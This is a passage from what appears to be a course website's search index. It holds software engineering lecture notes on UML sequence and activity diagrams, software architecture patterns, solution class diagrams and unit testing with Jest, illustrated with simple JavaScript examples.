(this.something()) from the object's class itself is a self message. </p> <p>In the example, the logger1 object's 'log' method execution can be shown by an activation bar. inside 'log' method 'this.format(message)' can be denoted as a self message because the method call is within the same object. A recursive message is a special type of self message where a new activation bar is included in the existing one. <pre><code>class Logger {\n  log(message) {\n    this.format(message);\n    console.log(message);\n  }\n\n  format(message) {\n    // Formatting logic\n  }\n}\nlet logger1=new Logger();\nlogger1.log('hello');\n</code></pre> 7. Found message</p> <p>Found messages are those that arrive from an unknown sender, or from a sender not shown on the current diagram due to coming from an external party. The message is said to be found by the receiving object which is in the system.</p> <p>In the code example, 'handleClick' method can be triggered by a user click which is invoked by a user which is not a part of the system. However, 'handleClick' method is run by an object in the system. <pre><code>//External event triggers a function \ndocument.addEventListener('click', handleClick); \nfunction handleClick(event) {// Found message\n  console.log('User clicked:', event);\n}\n</code></pre> 8. Lost message</p> <p>Lost messages are those that are either sent but do not arrive at the intended recipient, or which go to a recipient not shown on the current diagram. </p> <p>In the code example, sendAnalytics method is run in a third party service even though it is called from the system. Hence, in the system perspective the message is lost. <pre><code>function userClicksButton() {\n  const eventData = { event: \"button_click\", timestamp: Date.now() };\n\n  // Send data to external system, we don\u2019t care who receives or handles it\n  sendAnalytics(eventData);\n}\nfunction sendAnalytics(data) {\n  // Simulate a \"lost\" message by sending to external URL\n\n}\n</code></pre> 9. Duration message</p> <p>If it takes a significant time to perform the task in the message, we typically represent is as a duration message (a slanted arrow). </p> <p>In the code example, we show the method 'processHeavyTask()' called by 'server' object. In the sequence diagram, it is a slanted arrow from server Client object to the 'server' object with the message 'processHeavyTask()'. <pre><code>class Client{\n  let server= new Server();\n  function doSomething(){\n    const promise = server.processHeavyTask();\n    //Instantaneous call Task execution begins inside processHeavyTask (delayed)\n  }\n}\n</code></pre></p>"},{"location":"notes/l5_2_sequence_diagrams/#composed-elements","title":"Composed Elements","text":"<ol> <li>Conditional (Alternatives) Alternative composition is a combined fragment representing a mutually exclusive choice between different sequences of messages.</li> </ol> <p>In the code example, there are two choices namely, successful login and failed login. During successful login, 'displayDashboard()' is invoked, while during failed login, 'displayError()' is invoked which are two alternative message sequences in the sequence diagram.</p> <pre><code>function login(username, password) { \nif (authenticate(username, password)) { \n    displayDashboard(); \n} \nelse { \n    displayError(); \n} \n}\n</code></pre> <ol> <li>Loop Loop composition is a combined fragment representing a message sequence which is repeatedly executed (with the condition for ending repetition).</li> </ol> <p>In the code example, the invokation 'selectItem(item)' is executed for each item in the cart. Which are repetitive message sequences in sequence diagram.</p> <p><pre><code>const cart = ['item1', 'item2', 'item3'];\n\ncart.forEach(item =&gt; {\n  system.selectItem(item);\n  displayItemDetails(item);\n});\n</code></pre> 3. Parallel Parallel composition is a combined fragment in a sequence diagram that shows two or more lifelines performing actions concurrently. Each operand inside the par frame is executed in parallel, independently of the others.</p> <p>In the code example, 'taskA()' and 'taskB()' are asynchronous functions returning promises and work on their resolved promises independantly. When both are done, the 'combinedResult' is calculated since the 'await' blocks the 'combinedResult' until the</p> <pre><code>// Simulated async services\nfunction taskA() {\n  //do taskA and return promise\n}\n\nfunction taskB() {\n  //do taskB and return promise\n}\n\n// Aggregator combining results\nasync function requestData() {\n  console.log(\"Aggregator: Received request from Client\");\n\n  const resultA = taskA();\n  const resultB = taskB();\n\n  // Execute in parallel and wait for both results\n  const [resA, resB] = await Promise.all([resultA, resultB]);\n\n  const combinedResult = `${resA} + ${resB}`;\n  console.log(\"Aggregator: Returning combinedResult to Client\");\n  return combinedResult;\n}\n</code></pre>"},{"location":"notes/l6_1_sequence_diagrams_and_SA/","title":"50.003 - Sequence Diagrams (Contd)","text":""},{"location":"notes/l6_1_sequence_diagrams_and_SA/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to</p> <ol> <li>Describe elements of UML activity diagram</li> <li>Explain the steps to derive UML sequence diagram</li> <li>Derive a UML sequence diagram</li> </ol>"},{"location":"notes/l6_1_sequence_diagrams_and_SA/#sequence-diagram-introduction","title":"Sequence Diagram - Introduction","text":"<p>Refer to the previous lesson to recall the basics of sequence diagram.</p>"},{"location":"notes/l6_1_sequence_diagrams_and_SA/#derivation-of-a-sequence-diagram","title":"Derivation of a Sequence Diagram","text":"<p>It is important to understand which artifacts are needed to derive a sequence diagram as well as how to do it. Sequence diagram represents the sequence of message (method) flow between classes for a given use case. We will need the artifacts which defines the users (use case diagram/description), classes (class diagram) and sequences of interactions (activity diagram). We can follow the following steps from the beginning to derive a sequence diagram for a given use case.</p> <ol> <li> <p>Identify the use case : To find the scope covered by the sequence diagram we should identify the use case first.</p> </li> <li> <p>Derive use case diagram/description: The high level sequence of operations for a use case is mentioned in the use case description in the format of 1. user to system 2. system to user. The high level system will be refined to more specific class names later. </p> </li> <li> <p>Derive classes: The entities involved in the usecase are identified in the domain class diagram. More implementation level classes can also be identified.</p> </li> <li> <p>Derive activity diagram: What is the control flow of operations? A use case description can be transformed to the corresponding activity diagram by explicitly visualizing control flows (if-else, loops, parallel). Owning classes of the activities can also be included to the activity diagram as a refinement.</p> </li> </ol>"},{"location":"notes/l6_1_sequence_diagrams_and_SA/#example-transfer-funds-banking-app","title":"Example - Transfer Funds (Banking App)","text":"<p>Lets go through the above mentioned steps to derive the sequence diagram for Transfer Funds use case.</p>"},{"location":"notes/l6_1_sequence_diagrams_and_SA/#identify-the-use-case","title":"Identify the use case:","text":"<p>Use case is initiated by a customer of a banking app to transfer funds from the customer's account to another account.</p>"},{"location":"notes/l6_1_sequence_diagrams_and_SA/#derive-use-case-description","title":"Derive use case description","text":"ID:   UC2   Name:   Transfer Funds   Description:   Customer transfers money from her account to another account   Created By:   Dileepa Fernando  Date Created:  1st May 2025   Last Updated By:   Dileepa Fernando   Date Updated:   3rd May 2025   Actors:   Customer, SMS Gateway   Triggers:   The Customer clicks on Transfer menu   Preconditions:   Customer is logged in and authenticated   Postconditions:        1. the customer transfers the mentioned fund value to the selected recipient     2. The customer's balance is reduced by the mentioned fund value       Error States:    Fund transfer fail      Flow:       1. Customer inputs transfer details (source account, destination account, amount)     2. System validates the input     3. System verifies sufficient balance     4. System transfers funds     5. System records transaction     6. System confirms transfer to user        Alternative Flow:            2A Invalid input:     a. System shows validation error message     b. Customer is prompted to correct the input     c.  Flow resumes at Step 1     3A Insufficient Balance:     a. System shows validation error message     b. Customer is prompted to correct the input     c. Flow resumes at Step 1"},{"location":"notes/l6_1_sequence_diagrams_and_SA/#derive-domain-classes","title":"Derive Domain Classes :","text":"<p>For this step, we do not need to draw a detailed class diagram. It is sufficient to identify the entities first. The entities in the transfer funds are customer ,bank account and transaction. Customer has one or more bank accounts (single one in this scenario) and bank account contains a list of transactions. </p> Class Diagram for Transfer Funds"},{"location":"notes/l6_1_sequence_diagrams_and_SA/#derive-activity-diagram","title":"Derive activity diagram :","text":"<p>Introduction</p> <p>An activity diagram is a more explicit representation of use case description. The operational flow can be refined and the control flows (if-else, loop) can be explicitly shown. It is a directed graph having start node, stop node and activity nodes. The two nodes start does not have incoming edges while stop does not have outgoing edges.</p> Start Node Stop Node <p>The other nodes can represent activities, condition checks or converging after condition checks.</p> <ol> <li> <p>Activity node (rounded rectangle)</p> Activity Node </li> <li> <p>condition check node (hexagon) and converging node (diamond)</p> Condition Check Node Converging Node </li> </ol> <p>An edge from one node to another means the activity in second node immediately follows the activity in first node. The activity can be checking a condition too. </p> <ol> <li> <p>Non Condition nodes other than stop, has exactly one edge going out.</p> Activity Flow edge </li> <li> <p>Condition check nodes will have multiple edges going out and the edges can be annotated by the possible conditions. For each conditioned edge, there is a unique destination node which represents the next activity. All these destination nodes converge to a linear flow at a diamond node.</p> Condition diverge and converge edges </li> <li> <p>There can be back edges referencing activities which already happened. Back edges represent loops. Back edge starts from a diamond node representing the loop condition and ends with the first activity of the loop.</p> Loops and back edges </li> </ol> <p>Derivation of Activity Diagram for Bank App - Transfer Funds</p> <ol> <li>Draw the start and stop nodes</li> <li>Consider the operational flow in use case description. If there are operations that can be written in detail as multiple steps</li> <li>Identify the alternative flows. Consider adding condition nodes to represent the conditions resulting in alternative flows.</li> <li> <p>If the an alternative flow reaches a previous node represent it by a back edge.</p> Initial Activity Diagram </li> <li> <p>Refine the activity diagram: The initial activity diagram needs to be refined to contain details about classes too.</p> <ol> <li> <p>Use the class diagram to identify the classes involved in each activity (including condition checks) so that each activity can be tranformed to a message passed from one class to another. To achive this, we annotate the initial activity diagram with the domain classes. The class is generally identified by the object which changes after the activity. The annotation is applied to the outgoing edge after each activity node.</p> Initial Activity Diagram Annotated with Domain classes </li> <li> <p>If some activities cannot be related to a single class, it means that multiple classes are affected by the given activity. In this case, we decompose the activity node into multiple activity nodes (or sub activity diagram on its own) until we can assign each activity node to a single class. The decomposition can be another activity diagram on its own. In the example, we decompose the <code>record transaction</code> activity to the sequence of two activities <code>create transaction</code> followed by <code>record transaction</code>. Create transaction belongs to Transaction class while Record transaction belongs to account class allowing a single class annotation.</p> With expanded activities </li> <li> <p>Note that there are many activities without any specific class annotation. because those belong to the system. We can follow the high level MVC architecture and identify each class as one of MVC. The model refers to how data is being handled. Firstly, we have account and transaction classes in the model category which are already defined as domain classes. When it comes to implementation, we will have to add the database class as a model class. Secondly, We use UI class in general to refer view category. Finally, we define all other classes which route requests between view and model (Ex: Code in routes.js ) as controller classes. Following diagram shows the activity diagram, annotated with UI and controller classes.</p> Adding missing class annotations </li> <li> <p>Since we have the class annotations now, all we need to figure out is the lifelines and the messages between them. Life lines are exactly the annotated classes. Here, we are going to use the swim lane feature in activity diagram, where each swim lane (analogous to a life line) represents one class. Each node is placed in the swim lane which represents the class which is affected by the activity (including condition checks). The starting node and end node for each edge are not affected.</p> Activity Diagram with Swim Lanes </li> <li> <p>Note the loops and conditional sequences (highlighted in red)</p> </li> </ol> </li> <li> <p>Final mapping to the sequence diagram: </p> <ol> <li> <p>Swim lanes to life lines: An activity node in a swim lane can be mapped to a message arrow ending at the life line with the same name. The message arrow should start from the life line corresponding to previous activity. The text on the message arrow should be the name of the current activity being considered. For example, <code>validate input</code> activity starts from UI life line (swim lane of previous activity input transfer details) and ends from the Controller life line (swim lane of current activity) with the message text of <code>validate input</code>.</p> </li> <li> <p>For object creation, indicate a <code>create message</code> (Ex: create transaction message from Account to Transaction)</p> </li> <li> <p>For each message, add a return message. (Ex: return message for <code>Validate input</code> )</p> </li> <li> <p>If message A depends on the result of the message B, the message order should be 1. message A 2. message B 3. return message B 4. return message A (Ex:1. <code>input transfer details</code> 2. <code>validate input</code> 3. <code>return validate input</code> 4. <code>return input transfer details</code>)</p> </li> <li> <p>Add activation bars between each message and corresponding return message. (Ex: <code>validate input</code> <code>return validate input</code> has activation bar at the life line <code>Controller</code>)</p> </li> <li> <p>Map conditions in activity diagram to alt fragments in sequence diagram. Map loops in activity diagram to loop fragments in sequence diagram. Copy the conditions from hexagons to loop header and alt header.</p> </li> </ol> Final mapping to Sequence Diagram </li> </ol>"},{"location":"notes/l6_2_SA/","title":"50.003 - Software Architecture","text":""},{"location":"notes/l6_2_SA/#learning-outcomes","title":"Learning Outcomes","text":"<ol> <li> <p>Identify the MVC components from the UML design diagrams</p> </li> <li> <p>Extend MVC architecture model to a layered architecture model</p> </li> <li> <p>Describe how Service Oriented and Event Driven architectures help to scale and reuse software systems</p> </li> </ol>"},{"location":"notes/l6_2_SA/#what-is-software-architecture","title":"What is Software Architecture?","text":"<p>The high-level structure of software components and their interactions to meet functional and non-functional goals (scalability, extendability, security etc.) is referred to as the software architecture.</p> <p>The following are the main features of software architecture.</p> <ol> <li>Groups classes into larger parts</li> <li>Defines layers, modules, services</li> <li>Guides deployment and scalability</li> </ol> <p>When you have a detailed design with your UML, software architecture adds value by 1. Defining how your system\u2019s parts fit together 1. Bridging detailed UML design to real code structure 1. Ensuring maintainability, scalability, and clarity of the final system</p>"},{"location":"notes/l6_2_SA/#how-to-derive-a-software-architecture","title":"How to derive a software architecture?","text":""},{"location":"notes/l6_2_SA/#the-architectures-you-know","title":"The Architectures You Know","text":""},{"location":"notes/l6_2_SA/#client-server-architecture","title":"Client-Server Architecture","text":"<p>Client-Server architecture is the most basic and common software architecture. Any web app/ mobile app has the client part and the server part. Client part collects inputs from the user and shows the outputs to the user. Server part takes care of other business logic and data handling part. </p> <p></p>"},{"location":"notes/l6_2_SA/#model-view-controller-architecture-mvc","title":"Model-View-Controller Architecture (MVC)","text":"<p>In order to better manage the server, it can be further split into controller and model parts while keeping client as the view. In the javascript applications you developed before, we introduced this architecture.</p> <p>View was the front-end part you implemented using react. Controller was the routes classes which routed the http requests towards models and routed the responses from models towards the browser. Model is the part containing business logic and data storage/retrieval/processing part.</p>"},{"location":"notes/l6_2_SA/#how-to-derive-software-architecture-for-a-generic-design","title":"How to derive Software Architecture for a generic design?","text":"<p>By using the UML diagrams below, we can extract insights to derive the software architecture.</p> <ol> <li>Use case diagram: User Goals</li> <li>Domain class diagram: Model</li> <li>Sequence diagram: View \u2194 Controller \u2194 Model</li> <li>Solution class diagram: Concrete MVC classes</li> </ol> <p>Since we followed the MVC architecture in mind during the UML design process, we can easily extract MVC components from Sequence diagram and Solution class diagram.</p> <p>According to Sequence diagram, we can group the UI components (first contact to user) to view layer, next set of components which connect the UI components to domain components to controller layer, and domain and the after components to the model layer.</p> <p>Referring to the solution class diagram we can easily start from the UI class and follow the dependancy arrows to find the controller classes and model classes. After one dependancy step from UI, we find controller classes and after next step we find the model classes.</p> <p></p>"},{"location":"notes/l6_2_SA/#layered-architecture","title":"Layered Architecture","text":"<p>MVC architecture works well for UI driven projects. When we have many domain classes, it is better to split the model layer for easier management.</p> <p>The model layer above can be split into more meaningful layers namely, Service layer, Domain layer, Data layer, and Database layer. For a given functionality we will have a corresponding Service classes and data classes, which map to the domain classes.</p> <p>In the case of TransferFunds</p> <ol> <li>UI : TransferPage</li> <li>Application: TransferController</li> <li>Service: AccountService, TransactionService</li> <li>Domain: Account, Transaction</li> <li>Data: AccountRepository, TransactionRepository</li> <li>Database: Tables from the database design</li> </ol> <p></p> <p>A service is identified by organizing the controller methods from the MVC style sequence diagram.</p> <p>In the example of Transfer Funds, Transfer Controller uses Account model for check balance, and Transaction model for the transfer.</p> <p></p> <p>To make the service stacks independent, we can define unique owner from the service layer to each model. If a service needs to access models that it does not own, it should do it through service which owns the model of interest. These independant service stacks may be turned into micro services.</p> <p>In the example of Transfer Funds, Transaction model is owned by Transfer service and the Account model is owned by the Account service. When Transfer Service needs to access the Account model, it has to do it through the Account Service.</p> <p></p> <p>It is possible to integrate multiple use cases in a single layered architecture diagram as above.</p> <p>Here, Balance Page use case is also added to the UI and the Corresponding controller is added to the Controller layer. After that, Balance Controller also reuses the existing services. If the added controller uses a new model, then we need to introduce a new service.</p> <p>Refining with each use case, will result in the final service layered architecture diagram which shows UI components and controllers for each use case. </p> <p>There will be a service stack defined for each domain model class. Controllers can connect to one or more services. The services can interact with each other.</p>"},{"location":"notes/l6_2_SA/#other-software-architectures","title":"Other Software Architectures","text":""},{"location":"notes/l6_2_SA/#service-oriented-architecture","title":"Service-Oriented-Architecture","text":"<p>With the development of many software products which are reusable, software architectures also evolved. </p> <p>In case of larger enterprise systems, the sub systems like Core-banking Service, Loan Service and Card Service need frequent communication to perform major tasks. The number of direct communication channels substantially increases with the number of subsystems involved. In order to reduce the overhead of these direct communication, an intermediary called Enterprise Service Bus (ESB) is introduced. This architectural design pattern is referred to as System-Oriented architecture.</p> <p>ESB set different access points (end points) to each service in the company. Any service can exchange data with another service regardless of the data formats used by the systems. ESB helps to translate between data formats.</p> <p>Scaling: Services are decoupled since, direct communication is replaced by the ESB with well defined interfaces. As long as the ESB is scaled, integrated systems can be scaled. However ESB can be a single point of failure and a bottle neck due to it being centralized. Using cloud technologies which support automatic scaling has been able to address the bottle neck for some extent.</p> <p>Extensions: The logic inside ESB can be extended to support evolving UI, Database technologies as well as data formats.</p> <p>Security: The data and services should be properly authorized among developers and end users. Thorough authentication and authorization mechanisms followed by extensive testing are necessary to ensure data and service security.</p> <p></p>"},{"location":"notes/l6_2_SA/#microservices-architecture","title":"Microservices Architecture","text":"<p>Microservices architecture is one of the most commonly used architectural design pattern in the current era. Microservices are stateless (do not store any data after running) lightweight services with a single responsibility which can run and be deployed independantly (Can even be deployed in different platforms).</p> <p>For example, any method belonging to any layer in the layered architecture can be a microservice on its own. These microservices communicate with each other via API calls (Ex: REST) in contrast to using a central intermediary like ESB.</p> <p>Extensions: An application built with microservices can be easily extended (Ex: new UI or new DB) if proper abstraction is used.</p> <p>Scaling: Each microservice can easily be scaled up or down with the help of cloud technologies.</p> <p>Security: The data and services should be properly authorized among developers and end users. Thorough authentication and authorization mechanisms followed by extensive testing are necessary to ensure data and service security.</p> <p></p>"},{"location":"notes/l6_2_SA/#event-driven-architecture","title":"Event-Driven Architecture","text":"<p>Event-Driven architectural design pattern consider two types of system components namely event producers and event consumers. Event producers emit events for event producers to act upon. For example, OrderService can emit event so that PaymentHandler, NotificationHandler and AnalyticsHandler can act upon it. The events are added to an event queue managed by the event broker and handled in asynchronous manner implying that the services are loosely coupled in contrast to services being called in sequence. Event-Driven designs consider multiple usecases at once since it considers all the services which can act upon events.</p> <p>Extendability: To extend a system in Event-Driven architecture, new events can be introduced to be consumed by the existing consumers or newly built consumers while updating the event broker. If we need to integrate existing services (non event-driven) to event-driven architecture we need to update the service to emit events while updating the event broker.</p> <p>Scalability: Using the cloud technologies, multiple instances for each event consumer and producer can be automatically created.</p> <p>Security: While supporting many event emissions, maintaining integrity and access controlling is a challenge in Event-Driven architecture. Using digital signatures, having least privileges for events helps to make Event-Driven architectural implementations secure.</p> <p></p>"},{"location":"notes/l6_2_SA/#summary","title":"Summary","text":"<p>Client-Server, Mode-View-Controller, Layered architecture are most common architectural patterns in software systems.</p> <p>With the rise of reusable software systems and scaling requirements, new architectural patterns evolved to support extendability and scalability. Service-Oriented Architecture, Microservices Architecture and Event-Driven architecture are some of the widely used architectural patterns. We are able to see Client-Server, Layered architectural sub patterns inside these new architectures. </p> <p>For each of these new architectural patterns, there are unique security challenges present. Customized Authentition and Authorization methods are present to mitigate those security challenges.</p> <p>Choice of the architectural patterns for your project depends on the current trends, specific requirements and your organizational strategy.</p>"},{"location":"notes/l6_2_SA/#references","title":"References","text":"<ol> <li>https://www.serverwatch.com/guides/client-server-model/</li> <li>https://www.infoworld.com/article/2158174/what-is-service-oriented-architecture.html</li> <li> <p>https://medium.com/design-microservices-architecture-with-patterns/microservices-architecture-for-enterprise-large-scaled-application-825436c9a78a</p> </li> <li> <p>https://redborder.com/understanding-event-driven-architecture-and-combinations-in-software-engineering/</p> </li> </ol>"},{"location":"notes/l6_2_solutionclass_diagram/","title":"50.003 - Solution Class Diagrams","text":""},{"location":"notes/l6_2_solutionclass_diagram/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to</p> <ol> <li>Explain the concept of Solution class diagrams.</li> <li>Describe the difference between Domain class diagrams and solution class diagrams</li> <li>Derive solution class diagrams</li> </ol>"},{"location":"notes/l6_2_solutionclass_diagram/#solution-class-diagrams-introduction","title":"Solution class diagrams - Introduction","text":"<p>A solution class diagram is the structure of a software System. It Provides an implementation perspective and extends Domain Class diagram with Methods (+processSomeThing()), Visibility Modifiers (-accountId, +getId()) and Architecture Layers (ControllerClass). It also adds value to Sequence Diagrams by representing messages as class methods.</p>"},{"location":"notes/l6_2_solutionclass_diagram/#solution-class-diagrams-derivation","title":"Solution class diagrams - Derivation","text":"<p>The two inputs for a solution class diagram are the domain class diagram and the sequence diagram. The idea is to integrate methods and new classes (relationships too) introduced in Sequence diagram to the existing structure of the domain class diagram.</p>"},{"location":"notes/l6_2_solutionclass_diagram/#identify-data-types-of-the-attributes","title":"Identify Data Types of the Attributes","text":"<p>Let's first recap the domain class diagram that we did in previous week for TransferFunds scenario.</p> <p></p> <p>You can observe that the methods are omitted and explicit type details are not mandatory. We first refine the domain class diagram attributes with their data types (and exact data structures like \"List\" to show the multiplicity) explicitly as below.</p> <p></p>"},{"location":"notes/l6_2_solutionclass_diagram/#identify-methods-of-domain-classes","title":"Identify methods of Domain Classes","text":"<p>Recap the sequence diagram of the Transfer funds below.</p> <p></p> <p>According to the sequence diagram there are two Account objects namely SrcAccount and DesAccount. Account class has debit(amount), credit(amount), record(trans), rollbackDebit(amount) and rollbackCredit(amount) methods which are all called by TransferController class.</p> <p>Transaction class does not have methods.</p> <p></p>"},{"location":"notes/l6_2_solutionclass_diagram/#identify-and-define-the-new-classes","title":"Identify and Define the new Classes","text":"<p>Then we need to identify the new classes introduced in the sequence diagram. Here UI and TransferController classes are added.</p> <ol> <li> <p>UI class acts on behalf of the customer here to collect the inputs and send them to the system.</p> </li> <li> <p>TransferController class routes requests from UI to Account and Transaction and returns results back to the UI. This class is the middle party which makes UI class and Domain classes (Account, Transaction) isolated.</p> </li> </ol> <p>Remark: Database class or Repository class could have been considered in the sequence diagram. In this example, we assume that database classes will be added in later refinements to the sequence diagram. We follow the simple MVC architecture introduced in your javascript lessons.</p> <p>In order to define the attributes and methods of the new classes, we look at the messages passed to the sequence diagram.</p> <ol> <li> <p>Since UI receives input from customer, we can model an attribute InputDetails and the corresponding output message according to the sequence diagram.  Note that data type of InputData is abstracted as TransferFormData (tfd).  According to the sequence diagram, the methods in UI class is show(msg) which are return messages from controller.</p> </li> <li> <p>Considering TransferController class, we have to first identify its methods namely, validateInput(tfd) sending the customer details and transfer(tfd) sending the amount to be withdrawn. The corresponding outputs are validationStatus and transferStatus (success or fail)</p> <p>The methods it calls are accountBalance() , debit(amount), credit(amount), and new Transaction(src,des,amount). According to these methods, we can deduce the possible attributes of TransferController class.</p> <p>Note that TransferController class can derive fromAccount ,toAccount and amount attributes of the Account and Transaction classes by processing the TransferFormData sent from UI. TransferController then instantiates Account and Transaction objects to call the corresponding methods.</p> <p>On the other hand, outputs received by TransferController class can be used to call the UI methods instantly. Therefore, TransferController class does not have any attribute.</p> </li> </ol> <p></p>"},{"location":"notes/l6_2_solutionclass_diagram/#identify-the-new-relationships","title":"Identify the new relationships","text":""},{"location":"notes/l6_2_solutionclass_diagram/#inheritance","title":"Inheritance","text":"<p>The relationships are introduced with the new classes UI and TransferController. We first check for the inheritance relationships and conclude that there is no inheritance to highlight here (If more detail needed we may add some inherited classes of UI).</p>"},{"location":"notes/l6_2_solutionclass_diagram/#object-usage-uses-relationship","title":"Object Usage (uses relationship)","text":"<p>According to the sequence diagram, UI-&gt;TransferController and TransferController-&gt;Account are the message paths. </p> <p>Then we check the directions of the relationships. Here, TransferController class is always accessed by the UI class and not viceversa. Similarly, Account class is accessed by TransferController class and not viceversa. Therefore we conclude the directions of the new relationships.</p> <p>Finally, we evaluate the strength of the two relationships.</p> <ol> <li> <p>UI temporarily uses TransferController for validation purposes and route transfer message to Account class. UI does not save the reference to the TransferController as an attribute. Instead, UI creates TransferController object inside inputTransferDetails() method which calls validateInput(tfd) and transfer(tfd) internally. UI depends on TransferController.</p> </li> <li> <p>TransferController temporarily uses Account objects for balance checking and transfer. It also temporarily creates and uses Transaction object for transfer method. It already receives tfd from the UI class, hence do not need to store any details of Account to reference later. Therefore, TransferController depends on Account and Transaction. </p> </li> </ol> <p>For dependancy relationships we do not show multiplicity since, it is temporary usage. The final solution class diagram for \"transfer funds\" is as follows.</p> <p></p>"},{"location":"notes/l6_2_solutionclass_diagram/#tips-on-sequence-diagram-creation-to-easy-transformation-for-solution-class-diagram","title":"Tips on Sequence Diagram Creation to Easy Transformation for Solution Class Diagram","text":"<ol> <li> <p>Message should consist of what to do (method name), inputs,return message and return message type. It is a good practice to show all the return messages explicitly (including empty messages)</p> </li> <li> <p>Limit UI classes for input (tfd) attribute and show(msg) method.</p> </li> <li> <p>Limit Controller classes to be stateless. Use Controller class as a router between UI and Domain classes. </p> <ol> <li> <p>As long as a value is sent as method argument, no need to have an attribute to store it. Since UI class always store the input data, it can be sent to Controller as method arguments. Controller does not need to store it.</p> </li> <li> <p>Controller class can instantiate domain class objects, and pass arguments to domain class methods based on the arguments it receives from UI. </p> </li> <li> <p>Outputs the Controller object receives from Domain objects can be reused (with some transformations) inside the caller method of Controller object. Therefore no need to store additional Domain class status attributes in Controller class.</p> </li> <li> <p>If we need to store the state across a UI sequence (Ex: Booking ID from Booking UI to Payment UI), we can keep it inside the UI class. Therefore, Controller receives all the state information from UI and send it to the Domain classes without storing it. It is also possible to store the state in the Domain class and propagate it to UI class via the return message without Controller class storing it.</p> </li> </ol> </li> <li> <p>Can keep input messages to Controller and return messages from Controller unnamed, and have a meaningful name, after rest of the sequence diagram is drawn. (Ex: UI sends tfd to Controller. Controller calls accountBalance() , debit(amount) credit(amount) in the Account. Finally, Controller sends transfer_success message to UI. This entire sequence can be named transfer(tfd)).</p> </li> </ol>"},{"location":"notes/l8_1_softwaretesting/","title":"50.003 - Software Testing","text":""},{"location":"notes/l8_1_softwaretesting/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to </p> <ol> <li>Explain what is software testing</li> <li>Articulate the purpose of software testing</li> <li>List the components of a test  </li> <li>List the components of a test case</li> <li>Develop simple testsuite for JavaScript programs using Jest</li> </ol>"},{"location":"notes/l8_1_softwaretesting/#software-testing","title":"Software testing","text":"<p>Software testing is one of the methods to check and validate the produced software is behaving according to the specification.  </p> <p>Furthermore software testing helps to identify potential flaws in</p> <ul> <li>architectural design</li> <li>software security</li> <li>software performance</li> </ul> <p>The following is a quote adopted from IBM <code>https://www.ibm.com/topics/software-testing</code>.</p> <p>\"Software testing is the process of evaluating and verifying that a software product or application does what it is supposed to do. The benefits of testing include preventing bugs, reducing development costs and improving performance.\"</p>"},{"location":"notes/l8_1_softwaretesting/#why-software-testing","title":"Why software testing","text":"<p>The answer this question. One way is to find out what if we do not conduct software testing? In particular for large scale mission critical systems, the absence of testing often leads to epic failures and excessive monetary cost.</p> <p>For instance in 1998, NASA launched a Mars Climate Orbiter. However due to an English Unit to Metric translation errors, the Orbiter lost contact after it passed behind Mars.</p>"},{"location":"notes/l8_1_softwaretesting/#anantomy-of-software-testing","title":"Anantomy of software testing","text":""},{"location":"notes/l8_1_softwaretesting/#what-is-a-test","title":"What is a test?","text":"<p>A test in a software system is an act to exercise software with test cases.  A test have two goals</p> <ol> <li>to find faults.</li> <li>to show that the software behaves according to expectation (specification), i.e. to build confidence.</li> </ol> <p><pre><code>graph\n  Input--&gt;Program\n  Program--&gt;TO\n  TO[\"Test Oracle\"]--&gt;Pass\n  TO[\"Test Oracle\"]--&gt;Fail</code></pre> A test is a process of feeding the generated input to the test subject, i.e. the program,  the output will be verified by a test oracle, which returns either <code>Pass</code> or <code>Fail</code> as result. The test oracle is often implemented as another program.</p>"},{"location":"notes/l8_1_softwaretesting/#what-is-a-test-case","title":"What is a test case?","text":"<p>A test case is a formal documentation of a test. A test case consists of </p> <ul> <li>an identifier (often linked to the user case identifier).</li> <li>a description of the purpose and the use case description being tested.</li> <li>a precondition</li> <li>a set of inputs</li> <li>the expected output</li> <li>the expected postcondition</li> <li>the execution history (the log)</li> </ul>"},{"location":"notes/l8_1_softwaretesting/#limitation-of-software-testing","title":"Limitation of Software testing","text":"<p>Despite the importance of testing, testing alone is insufficient to ensure software free from bugs, since a failed test implies the existence of a software bug, a passed test implies that the software behaves according to the specification when given a particular instance of the input. But what about other input instances? What if the domain of the input is infinite. </p> <p>\"Testing shows the presence, not the absence of bugs\" -- Edsger Dijkstra </p>"},{"location":"notes/l8_1_softwaretesting/#testing-a-nodejs-app","title":"Testing a Node.js app","text":"<p>There are many tools for testing Node.js app. Jest is the one of the most popular option.</p> <p>To add Jest to a Node.js project, we can run</p> <p><pre><code>npm i jest\n</code></pre> in the project description file <code>package.json</code> change the follow line </p> <p><pre><code>\"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"\n</code></pre> to  <pre><code>\"test\": \"jest\"\n</code></pre></p> <p>Consider in the <code>src/mymath.js</code> </p> <pre><code>//\nfunction sum(x,y) {\n    return x + y;\n}\n\nmodule.exports =  {sum}\n</code></pre> <p>In the <code>test/mymath.test.js</code></p> <pre><code>const mymath = require('../src/mymath.js');\n\ndescribe(\"mymath sum test-suite\", () =&gt; {\n    test (\"summing of two positive numbers\", () =&gt; {\n        const result = mymath.sum(1,2);\n        expect(result).toBe(3);\n    });\n    test (\"summing of two negative numbers\", () =&gt; {\n        const result = mymath.sum(-3,-2);\n        expect(result).toBe(-5);\n    });\n})\n</code></pre> <p>The <code>describe()</code> function defines a set of tests should be logically grouped together as a test suite. In the above case, in the test suite consists of two tests. Each test is define by a call to <code>test()</code> function, which expect a description fo the test, the action test function. In the test function, we compute the actual result by calling the test subject, <code>sum()</code>, and compares it with the execpted result. </p> <p>To execute the test, we run</p> <p><pre><code>npm run test\n</code></pre> which runs the above test suite against the test subject and generates the following report in the console.</p> <pre><code>&gt; my_test_app@1.0.0 test\n&gt; jest\n\n PASS  test/mymath.test.js\n  mymath sum tests\n    \u2713 summing of two positive numbers (12 ms)\n    \u2713 summing of two negative numbers (3 ms)\n\nTest Suites: 1 passed, 1 total\nTests:       2 passed, 2 total\nSnapshots:   0 total\nTime:        0.35 s, estimated 1 s\nRan all test suites.\n</code></pre>"},{"location":"notes/l8_1_softwaretesting/#testing-oop","title":"Testing OOP","text":"<p>We can use Jest to test an object instance of a class, consider the following file <code>src/FibSeq.js</code></p> <pre><code>// src/FibSeq.js\nclass FibSeq {\n    constructor() {\n        this.prev = 0;\n        this.curr = 1;\n    }\n    next() {\n        let res = this.prev + this.curr;\n        this.prev = this.curr;\n        this.curr = res;\n        return res;\n    }\n}\n\nmodule.exports = FibSeq;\n</code></pre> <p>We can test it with the following test suite</p> <p><pre><code>const FibSeq = 